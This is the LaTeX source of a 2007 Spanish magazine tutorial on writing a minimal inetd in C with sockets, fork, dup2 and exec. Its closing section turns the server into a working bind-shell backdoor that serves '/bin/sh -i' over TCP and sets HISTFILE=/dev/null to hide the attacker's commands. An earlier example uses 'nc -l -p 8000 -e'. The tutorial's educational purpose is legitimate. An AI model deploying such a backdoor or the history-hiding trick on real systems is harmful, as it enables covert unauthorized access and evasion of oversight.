@@ -1,0 +1,730 @@
+% Este fichero es parte del Número 2 de la Revista Occam's Razor
+% Revista Occam's Razor Número 2
+%
+% (c) 2007, Occam's Razor
+% Contenido disponible bajo licencia 
+% Reconocimiento-No comercial-Compartir bajo la misma licencia 2.5 España 
+% de Creative Commons. 
+%
+% Para ver una copia de esta licencia, visite 
+% http://creativecommons.org/licenses/by-nc-sa/2.5/es/ o envie una
+% carta a Creative Commons, 559 Nathan Abbott Way, Stanford, California 94305, USA.
+% 
+
+% Sección Mú Rápido
+%
+% Incluye imagen del artículo
+
+
+\rput(1.5,-2.3){\resizebox{!}{6cm}{{\epsfbox{images/superdaemon-1.eps}}}}
+
+% -------------------------------------------------
+% Cabecera
+\begin{flushright}
+\msection{introcolor}{black}{0.25}{MÚ RÁPIDO}
+
+\mtitle{7cm}{Crea tu propio SuperDemonio}
+
+\msubtitle{6cm}{... y otras cosas más curiosas}
+
+{\sf por Er del Aberno}
+
+
+
+{\psset{linecolor=black,linestyle=dotted}\psline(-12,0)}
+\end{flushright}
+
+\vspace{2mm}
+% -------------------------------------------------
+
+\begin{multicols}{2}
+
+\intro{introcolor}{E}{n el número anterior vimos como crear servicios de red de forma
+rápida, utilizando el superdemonio inetd. Eso está muy bien,
+pero... no tenéis curiosidad por saber como funciona esa
+aplicación?. Bueno a lo mejor no, pero que pensaríais si en lugar de
+hablar de inetd, hablamos de puertas traseras?... Aha!
+}
+
+Como veremos muy pronto, programar una versión reducida de inetd se
+puede hacer ``mú rápido'', sin embargo, aunque el programa va a ser más
+bien pequeño, habrá un montón de conceptos del entorno de programación
+UNIX que debemos conocer.
+
+Básicamente, necesitamos saber cómo crear sockets, como crear procesos
+y como funciona la redirección de entrada/salida. No os preocupéis, es
+mucho más fácil de lo que parece.
+
+\sectiontext{white}{black}{LOS SOCKETS}
+
+Puesto que vamos a estar hablando de ellos todo el rato, parece
+apropiado dedicarle unas palabras.
+
+A todos los efectos, un socket se puede ver como un descriptor de
+fichero asociado a una conexión de red. Como todos sabemos, los
+descriptores de fichero son números que los programas utilizan para
+referenciar los ficheros que utilizan.
+
+Con los sockets sucede lo mismo, con la diferencia de que cuando
+escribimos en el socket, enviamos datos por la red y cuando leemos
+del socket estaremos recibiendo datos por la red, en lugar de/a un fichero.
+
+La mayoría de las aplicaciones de red que existen utilizan la
+implementación BSD, aunque existen otras soluciones para las
+comunicaciones por red.... pero en eso no vamos a entrar.
+
+Los sockets se pueden usar para establecer canales de comunicación
+utilizando distintas familias de protocolos y distintas semánticas de
+comunicación (es decir, como se lleva a cabo esta comunicación). En
+este artículo vamos a utilizar la familia de protocolos IPv4 y
+concretamente una semántica orientada a conexión (TCP). 
+
+Los más curiosos podéis echarle un ojo a la página del manual para la
+llamada al sistema socket (man 2 socket), y los más, más curiosos no os
+podeis perder:  man 7 tcp; man 7 udp, man 7 socket, etc... comprobad
+la sección ``SEE ALSO'' al final de las páginas del manual.
+
+\columnbreak
+
+\sectiontext{white}{blacl}{EL SOCKET DEL SERVIDOR}
+
+Tras esta brevísima introducción vamos al tema.
+
+Lo primero que vamos a hacer, es crear el socket con el que nuestro
+servidor aceptará conexiones en un determinado puerto. Para ello tenemos
+que crear un socket y decirle en que puerto debe esperar
+conexiones. Lo primero que tenemos que hacer es incluir unos cuantos
+ficheros de cabecera en nuestro programa:
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}  
+// Estos los necesitaremos más tarde   
+#include <string.h> 
+#include <stdlib.h>
+
+#include <unistd.h>
+
+// Específicos de red
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#include <fcntl.h>
+\end{lstlisting}
+
+Estos ficheros de cabecera incluyen la definición de los tipos de
+datos y funciones que vamos a utilizar en nuestro programa. Por ahora
+no tienen mayor interés y simplemente deben estar ahí. 
+
+Vamos con el código de verdad. Lo primero que tenemos que hacer es
+crear el socket y configurarlo como un socket ``que escucha'', es decir,
+que acepta conexiones. Vamos a definir una pequeña función para facilitar las cosas.
+
+\begin{lstlisting}     
+int crea_server_socket (int puerto)
+{
+  struct sockaddr_in   server, client;
+  socklen_t            sa_len = 
+                        sizeof(struct sockaddr_in);
+  int                  s, as;
+  
+  server.sin_addr.s_addr = INADDR_ANY;
+  server.sin_family = AF_INET;
+  server.sin_port = htons(puerto);
+  
+  s = socket (PF_INET, SOCK_STREAM, 0);
+  if (
+   (bind (s, (struct sockaddr*)&server, sa_len) < 0))
+    {
+      fprintf (stderr, 
+          "FATAL: Cannot bind to port %d\n", puerto);
+      exit(1);
+    }
+  listen (s, 1);
+
+  return s;
+}
+\end{lstlisting}
+
+
+Como os podéis imaginar esta función toma como parámetro el puerto en
+el que nuestro socket esperará conexiones, y nos devuelve el socket ya
+configurado. Sí, un socket es solo un número (tipo int).
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\ebOpage{introcolor}{0.25}{MÚ RÁPIDO}
+
+La estructura \verb!sockaddr_in! es la que nos permite configurar el puerto
+en el que vamos a escuchar. Si estuviéramos escribiendo un cliente, la
+constante \verb!INADDR_ANY! se sustituiría por la dirección IP de la máquina
+a la que nos queremos conectar... bueno, hay que llamar a alguna
+función extra para convertir la dirección de la máquina en algo que
+entienda el sistema.
+
+A continuación creamos un socket para una comunicación IPv4. Vamos,
+Internet. Y le indicamos que vamos a utilizar una semántica de
+``chorro'' ({\em stream}). Esto dicho así suena muy mal, pero lo que significa, al fin
+y al cabo, es que vamos a utilizar el protocolo TCP. 
+
+Realmente el protocolo se especifica en el último parámetro, pero
+normalmente, una vez fijada la familia de protocolos y la semántica de
+comunicación solo existe un protocolo posible, por lo que el último
+parámetro de la llamada al sistema socket será casi siempre 0.
+
+Bien, ahora tenemos que asignar a nuestro socket la
+información de dirección de red que tenemos almacenada en la variable
+server. Esto es lo que hace la llamada al sistema bind.
+
+Finalmente, configuramos el socket para aceptar conexiones. Esta es la
+finalidad de la llamada al sistema listen. El segundo parámetro de
+esta llamada al sistema define el tamaño de la cola de conexiones
+entrantes, es decir, cuantas conexiones pueden estar esperando para
+ser atendidas. En breve sabremos que es eso de ``atender conexiones''.
+
+Aunque no vamos a entrar en ello, que sepáis que el proceso de
+creación de un socket para una aplicación cliente (como vuestro
+browser o vuestro cliente de correo) es exactamente igual a la
+descrita hasta que se invoca la llamada al sistema listen, siendo la
+llamada a bind opcional.
+
+\sectiontext{white}{black}{ATENDIENDO CONEXIONES}
+
+Vale, ya tenemos nuestro socket configurado, y ahora tenemos que
+atender las conexiones que se realicen por la red. Para ello, lo
+primero que tenemos que hacer es aceptar la conexión entrante. Vamos a
+escribir otra función para poder hacer esto:
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+int acepta_conexion (int s)
+{
+  struct sockaddr_in client;
+  socklen_t          sa_len = 
+                      sizeof(struct sockaddr_in);
+
+  return accept (s, (struct sockaddr*) &client, 
+                 &sa_len);
+}
+\end{lstlisting}
+
+
+Está claro no?. Para aceptar una conexión tenemos que utilizar la
+llamada al sistema accept :). Esta llamada, espera a que alguien
+intente conectarse al socket 's'. Cuando llega esa conexión, se crea
+un nuevo socket que será utilizado para la comunicación entre cliente
+y servidor, de forma que el servidor pueda seguir aceptando conexión
+mientras ``atiende'' la que acaba de aceptar.
+
+Con todo esto, y sabiendo que podemos acceder a los sockets como si
+fueran ficheros, vamos a generar nuestro propio servidor de echo
+autónomo :).
+
+\sectiontext{white}{black}{UN SERVIDOR DE ECHO}
+
+En el número anterior vimos varios ejemplos del código principal de un
+servidor de echo que funciona con inetd, con lo que no deberíais tener
+problema en escribirlo vosotros mismos... Bueno, vale. La función
+sería algo tal que así:
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+int procesa (int s)
+{
+  unsigned char  buffer[1024];
+  int            len;
+
+  len = read (s, buffer, 1024);
+  write (s, buffer, len);
+
+  return 0;
+}
+\end{lstlisting}
+
+
+Como podéis ver, la función es exactamente igual a la utilizada con
+inetd, pero en lugar de utilizar stdin y stdout, utilizamos un
+socket. Este tema ya lo solucionaremos más tarde :).
+
+Con esta función, la función main de nuestro servidor será algo como
+esto:
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+int main (int argc, char argv[])
+{
+  int    s, s1;
+
+  s = crea_server_socket (atoi(argv[1]));
+  s1 = acepta_conexion (s);
+  close (s);
+  procesa (s1);
+  close (s1);  
+ 
+  return 0;
+}
+\end{lstlisting}
+
+Esto ya no tiene tan mala pinta no?. Así que, a dónde hemos llegado?.
+
+Pues tenemos todo el código de red que inetd nos proporcionaba en
+nuestro primer ejemplo. Bueno, se trata de una versión bastante
+reducida. Por ejemplo, nosotros solo podemos escuchar en un
+puerto... pero esas nimiedades ya las solucionaremos más tarde. 
+
+Lo que ahora nos interesaría es poder ejecutar cualquier programa para
+atender nuestras conexiones, y además hacerlo de una forma tan
+sencilla como inetd lo hace.
+
+\sectiontext{white}{black}{LANZANDO UN PROCESO EXTERNO}
+
+Ahora es el momento de tener a mano nuestro servicio de echo externo,
+el que desarrollamos en el número anterior, porque en menos que canta
+un gallo lo vamos a estar ejecutando desde nuestro pequeño
+servidor. JA!
+
+Para ello modificamos la función procesa, o creamos una nueva
+actualizando la función main de forma acorde. La nueva función será
+algo tal que así:
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+int procesa (int s, char *prg)
+{
+  dup2(s, 0);
+  dup2(s, 1);
+  dup2(s, 2);  
+  return system (prg);
+}
+\end{lstlisting}     
+
+
+La magia de todo esto está en la llamada al sistema dup2. Esta llamada
+al sistema recibe como parámetros dos descriptores de ficheros, y
+hace, que ambos sean utilizables de forma intercambiable.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\ebOpage{introcolor}{0.25}{MÚ RÁPIDO}
+
+Así que lo que hacemos es ``duplicar'' los descriptores de
+entrada/salida estándar (stdin, stdout y stderr) para que sean ``iguales'' a
+nuestro socket. De esta forma, lo que estamos haciendo es redirigir la
+entrada/salida estándar del nuevo proceso a nuestro socket. Igualito que hacía inetd.
+
+Una vez que la entrada/salida estándar ha sido redireccionada a
+nuestro puerto de comunicación, simplemente ejecutamos nuestro
+``servicio'' externo utilizando system.
+
+Ingreíble!. En menos de 60 líneas de código tenemos una microversión de
+inetd. Evidentemente inetd hace un montón de cosas más (algunas las
+veremos a continuación), pero en esencia funciona como acabamos de
+describir.
+
+Vamos a probarlo. En una consola compilamos nuestro server y lo lanzamos indicándole
+que utilice nuestro servicio echo escrito en perl, que escribimos en
+el número anterior:
+
+\begin{mexample}
+{\small
+\begin{verbatim}
+occam@razor$ make server_simple
+occam@razor$./server_simple 8080 ./echo.pl
+\end{verbatim}
+}
+\end{mexample}
+
+
+Ahora, desde otro terminal, utilizamos netcat para conectarnos a
+nuestro servidor y escribimos algo para probar el servicio de echo.
+
+\begin{mexample}
+{\small
+\begin{verbatim}
+occam@razor$ nc localhost 8080
+Hola Mundo!!!
+Hola Mundo!!!
+occam@razor$
+\end{verbatim}
+}
+\end{mexample}
+
+
+Parece que va como la seda ;). Y...
+
+
+\begin{mexample}
+{\scriptsize
+\begin{verbatim}
+occam@razor$ strip server_simple
+occam@razor$ ls -lh
+-rwxr-xr-x 1 occam occam   41 2007-02-20 09:03 echo.pl
+-rwxr-xr-x 1 occam occam 3.9K 2007-02-20 09:09 server_simple
+-rw-r--r-- 1 occam occam 1.2K 2007-02-20 09:03 server_simple.c
+\end{verbatim}
+}
+\end{mexample}
+
+Y en menos de 4Kb... no está nada mal :). La verdad es que inetd es
+bastante pequeño, unos 20Kb, pero bueno, esta es nuestra criatura ;).
+
+\sectiontext{white}{black}{SUSTITUYENDO SYSTEM}
+
+La función system está muy bien, ya que es muy sencilla de utilizar,
+pero no nos da demasiado control sobre lo que ejecutamos. Así que
+vamos a hacer nuestra propia versión de system.
+
+Fijaros en esta nueva versión de la función procesa.
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+int procesa (int s, char *prg)
+{
+  pid_t   pid;
+  char    *name[2];
+
+  if ((pid = fork ()) < 0)
+    fprintf (stderr, "No puedo crear el proceso");
+  else
+    {
+      if (pid) /* Proceso padre */
+	{
+	  printf ("Proceso hijo es %d\n", pid);
+	  close (s);
+	}
+      else
+	{
+	  dup2(s, 0);
+	  dup2(s, 1);
+	  dup2(s, 2);
+
+	  name[0] = prg;
+	  name[1] = NULL;
+	  
+	  execv (name[0], name);
+	  exit (1);
+	}
+    }
+}
+\end{lstlisting}     
+
+A falta de una llamada a wait, acabamos de implementar nuestra
+particular versión de system. De hecho, al no usar wait y hacer que el
+proceso padre espere a que termine el hijo, estamos lanzando nuestro
+proceso en paralelo.
+
+En esta nueva versión de procesa se utilizan tres llamadas al sistema. La primera de
+ellas es fork, que nos permite crear un nuevo proceso. Esta llamada al
+sistema creará un nuevo proceso que será idéntico al proceso padre, es
+decir, después de su ejecución tendremos dos procesos iguales
+ejecutándose en el mismo punto (justo después de la llamada a fork).
+
+Así que lo que tenemos que hacer es ejecutar cosas distintas en el
+proceso original y en el proceso hijo (el que acabamos de crear). Para
+ello, simplemente hay que comprobar el valor que nos ha devuelto
+fork. El proceso padre recibe el identificador del proceso hijo que se
+ha generado, mientras que el proceso hijo recibe un 0. En lenguaje
+llano, el padre conoce a sus hijos, pero los hijos no tienen ni idea
+de quién es su padre... en estas circunstancias casi sería más
+correcto hablar de proceso madre que de proceso padre... que nunca se
+sabe :).
+
+Así que, el proceso padre simplemente vuelve de la función, mientras
+que el proceso hijo tendrá que ejecutar nuestro programa externo.
+
+\sectiontext{white}{black}{EJECUTANDO PROCESOS}
+
+A la vista de nuestra última versión de procesa, es evidente que la forma de ejecutar un
+programa es utilizando la llamada execv de nuestra función de atención
+de conexiones. Así es, pero es necesario hacer un par de comentarios.
+
+El primero es que cuando se crea un nuevo proceso utilizando fork,
+este proceso hereda todos los descriptores abiertos por el proceso
+padre (el que llama a fork). Como dijimos más arriba son idénticos.
+Como dos gotas de agua. Realmente hereda algunas cosas más. Los más
+curiosos que se remitan al manual (man fork).
+
+En principio, el proceso hijo continúa su ejecución después del fork,
+y podríamos incluir el código del servidor directamente ahí, pero si
+lo  que queremos es ejecutar otro programa,
+entonces tenemos que cambiar el ``código'' del proceso hijo. Y esto es
+lo que hace exec.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\ebOpage{introcolor}{0.25}{MÚ RÁPIDO}
+
+Utilizando la terminología de las páginas del manual, exec sustituye la imagen del proceso
+actual con una nueva imagen de proceso que obtiene de un programa
+externo almacenado en el disco.... Es algo así como una posesión :)
+
+Observad que la llamada exec sustituye la imagen del proceso, pero
+mantiene abiertos los descriptores de ficheros del proceso que la
+invoca. De otra forma, todo esto no funcionaría.
+
+\sectiontext{white}{black}{DEJANDO EL SERVIDOR EN CONDICIONES}
+
+Bien, si hasta el momento habéis estado probando el código que hemos
+presentado, habréis comprobado un par de efectos un poco incómodos.
+
+El primero es que justo después de ejecutar el servidor, la llamada a
+bind falla, diciendo que la dirección ya está en uso. Los más curiosos
+pueden indagar en los viejos tomos (vamos, los RFC y la biblia de
+Stevens) sobre el estado maldito: \verb!TIME_WAIT!. Algún día hablaremos
+sobre los entresijos del TCP/IP, pero no hoy.
+
+Para los que pasamos de todo, simplemente vamos a indicar al sistema
+que permita la reutilización de direcciones. Esto debemos hacerlo
+después de crear el socket (sino a ver que modificamos), y antes de
+hacer el bind (que es lo que nos da problemas :).
+
+La nueva versión \verb!crea_server_socket! quedaría así:
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+int crea_server_socket (int puerto)
+{
+  struct sockaddr_in server;
+  socklen_t          sa_len = 
+                      sizeof(struct sockaddr_in);
+  int                s;
+  int                ops = 1;
+  
+  server.sin_addr.s_addr = INADDR_ANY;
+  server.sin_family = AF_INET;
+  server.sin_port = htons(puerto);
+  
+  s = socket (PF_INET, SOCK_STREAM, 0);
+
+  setsockopt (s, SOL_SOCKET, SO_REUSEADDR, 
+              &ops, sizeof(ops));
+  if (
+   (bind (s, (struct sockaddr*)&server, sa_len) 
+        < 0))
+    {
+      fprintf (stderr, 
+      "FATAL: Cannot bind to port %d\n", puerto);
+      exit(1);
+    }
+  listen (s, 1);
+
+  return s;
+}
+\end{lstlisting}     
+
+Sí, así es. Los socket tienen opciones (alguien ha consultado la
+sección 7 del manual... man 7 socket?). Y se pueden modificar con esa
+función que está antes del bind.
+
+Bueno, ya nos hemos librado de un problema... pero todavía queda otro.
+
+\sectiontext{white}{black}{CONTROLANDO A LOS CHIQUILLOS}
+
+Como se suele decir, los chiquillos son unos demonios. Pero a veces,
+pueden llegar a ser zombies :). Afortunadamente, si utilizáis Linux,
+el sistema se suele encargar de estos molestos zombies, pero, para
+evitar sorpresas en otros sistemas, es mejor dar buena cuenta de
+ellos.
+
+Un proceso se queda en estado zombie, cuando su padre termina la
+ejecución antes que él. En ese caso, el proceso se queda esperando
+para retornar el resultado a su padre. Como el padre ya no existe,
+pues ahí se queda el pobre, ni vivo, ni muerto... vamos un zombie
+total.
+
+Para evitar esto, el padre debe ejecutar la llamada al sistema wait,
+la cual hace que espere hasta que sus hijos terminen de ejecutarse y
+devuelvan un código de salida (el introducido en llamada a exit o el return en la
+función main).
+
+Lo normal es manejar esta situación utilizando señales, concretamente
+proporcionando un manejador para la señal SIGCHLD, que se genera cada
+vez que un proceso hijo se para o termina. Es muy sencillo para los
+que queráis probarlo. Nosotros simplemente esperaremos por nuestro
+primogénito justo después de la llamada a procesa. Para ello, modificaremos la
+función main de esta guisa.
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+int main (int argc, char *argv[])
+{
+  int                  s, as, status;
+  
+  s = crea_server_socket (atoi(argv[1]));
+  as = acepta_conexion (s);
+  procesa (as, argv[2]);
+  printf ("Mi primogénito %d ha terminado\n", 
+           wait(&status));
+  close(as);
+  close (s);
+}
+\end{lstlisting}     
+
+No olvidéis añadir la siguiente línea junto al resto de includes:
+
+\verb!#include <sys/wait.h>!
+
+Probad de nuevo el servidor... y conoced el ``nombre'' del
+primogénito. JAAA, JAAA, JAAA!!!!
+
+\sectiontext{white}{black}{nc -c}
+
+En la sección, ``El Rincón de los Lectores'', de este mismo número,
+podéis encontrar un mensaje que nos envío SLaYeR. En él nos comenta
+que su versión de netcat, no tiene la opción -c. 
+
+Si descargáis la última versión de netcat, veréis que efectivamente
+esa opción no está disponible. Y que implica esto... básicamente que
+no podéis pasar parámetros al programa que netcat ejecutará. Probad
+esto:
+
+\begin{mexample}
+{\small
+\begin{verbatim}
+$ nc -l -p 8000 -e 'ls /tmp'
+
+En otra consola
+
+$  nc localhost 8000
+exec ls /tmp failed : No such file or directory
+\end{verbatim}
+}
+\end{mexample}
+
+Como podéis observar, no funciona. La perdida opción -c es la que
+permite realizar esto. Básicamente lo que hace es invocar la shell con
+esa misma opción (-c) lo que le indica que interprete la cadena de
+caracteres que sigue a continuación.
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\eOpage
+
+\rput(13,-19.5){\resizebox{!}{15cm}{{\epsfbox{images/lector.eps}}}}
+
+\bOpage{introcolor}{0.25}{MÚ RÁPIDO}
+
+Con todo lo que hemos visto hasta aquí y este último comentario,
+deberíais ser capaces de añadir esa opción a vuestro netcat. Para que
+la cosa quede más clara, aquí esta la función de netcat que ejecuta el
+programa, y de la que deberíais hacer una nueva versión:
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+doexec (fd)
+  int fd;
+{
+  register char * p;
+
+  dup2(fd,0);/* the precise order of fiddlage */
+  close(fd); /* is apparently crucial; this is */
+  dup2 (0,1);/* swiped directly out of "inetd".*/
+  dup2 (0,2);
+  p = strrchr(pr00gie,'/'); /* shorter argv[0]*/
+  if (p)
+    p++;
+  else
+    p = pr00gie;
+Debug (("gonna exec %s as %s...", pr00gie, p))
+  execl (pr00gie, p, NULL);
+  bail ("exec %s failed", pr00gie); 
+        /* this gets sent out.  Hmm... */
+} /* doexec */
+\end{lstlisting}     
+
+Os suena?. Bueno, esperamos que alguien se anime. Es un ejercicio interesante.
+
+
+\sectiontext{white}{black}{ZONA GEEK: BACKDOOR}
+
+Al principio del artículo, comentábamos que quizás esto sería más
+interesante si en lugar de superdemonios habláramos de puertas
+traseras o backdoors como dicen los angloparlantes.
+
+Muchos lectores avispados ya habrán intuido como convertir nuestro
+sencillo servidor en una puerta trasera muy simple. Para los más
+despistados, aquí está la modificación de la función procesa para
+rematar la transformación.
+
+\lstset{language=C,frame=tb,framesep=5pt,basicstyle=\scriptsize}
+\begin{lstlisting}     
+int procesa (int s, char *prg)
+{
+  pid_t   pid;
+  char    *name[3], *env[2];
+
+  if ((pid = fork ()) < 0)
+    fprintf (stderr, "No puedo crear el proceso");
+  else
+    {
+      if (!pid) /* Proceso hijo */
+	{
+	  dup2(s, 0);
+	  dup2(s, 1);
+	  dup2(s, 2);
+
+	  name[0] = "/bin/sh";
+	  name[1] = "-i"; 
+	  name[2] = NULL;
+
+	  env[0] = NULL;
+	  execve (name[0], name, env);
+	  exit (1);
+	}
+    }
+  return 0;
+}
+\end{lstlisting}     
+
+Si ahora, ejecutamos nuestro servidor como siempre (no hace falta
+indicar ningún programa a ejecutar), lo que obtenemos al conectarnos
+es:
+
+\begin{mexample}
+{\small
+\begin{verbatim}
+$ nc localhost 8080
+sh: no job control in this shell
+sh-3.1$ exit
+exit
+\end{verbatim}
+}
+\end{mexample}
+
+Sí... un acceso shell mola eh?. Si os fijáis, hemos añadido una nueva
+variable \verb.env. y hemos cambiado la función exec a utilizar. Esta nueva
+versión, execve, nos permite, además de ejecutar un determinado
+programa con sus parámetros, establecer una serie de variables de
+entorno para la ejecución del mismo.
+
+En nuestro ejemplo no hemos establecido ninguna... pero probad a
+incluir estas líneas
+
+\begin{lstlisting}     
+env[0]="HISTFILE=/dev/null";
+env[1]=NULL;
+\end{lstlisting}     
+
+Sobran las explicaciones no?... Bueno, vale. Lo que hacemos es cargarnos el fichero
+de historia de la shell, con lo que no quedará constancia de los
+comandos que hayamos escrito a través de nuestro backdoor. Mola!
+
+\sectiontext{white}{black}{EN EL PRÓXIMO NÚMERO}
+
+En el próximo número, veremos como modificar nuestro servidor para que
+pueda escuchar en varios puertos simultáneamente, como hace inetd, y
+algunas cosillas más :).
+
+Hasta el próximo número.
+
+
+\raggedcolumns
+\clearpage
+
+\end{multicols}
+
+
+
+\clearpage
+\pagebreak
